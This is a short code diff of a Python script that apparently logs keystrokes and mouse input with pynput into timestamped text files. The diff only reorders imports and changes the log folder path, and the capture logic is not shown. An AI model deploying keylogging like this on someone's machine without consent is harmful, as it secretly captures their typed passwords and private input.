@@ -1,5 +1,9 @@
 import datetime
 import os
+import time
+from pynput import keyboard
+from pynput import mouse
+import datetime
 
 # Get the current date and time
 current_datetime = datetime.datetime.now()
@@ -8,15 +12,10 @@ current_datetime = datetime.datetime.now()
 formatted_datetime = current_datetime.strftime("%Y-%m-%d_%H-%M-%S")
 
 # Specify the folder path where you want to store the file
-folder_path = "/home/psyduck/Desktop/Log_File"
+folder_path = "./Logs"
 
 # Create the full file path including folder path and filename
 filename = os.path.join(folder_path, f"{formatted_datetime}.txt")
-
-from pynput import keyboard
-from pynput import mouse
-import datetime
-
 
 # Global variable to store the logged keys
 logged_string=""
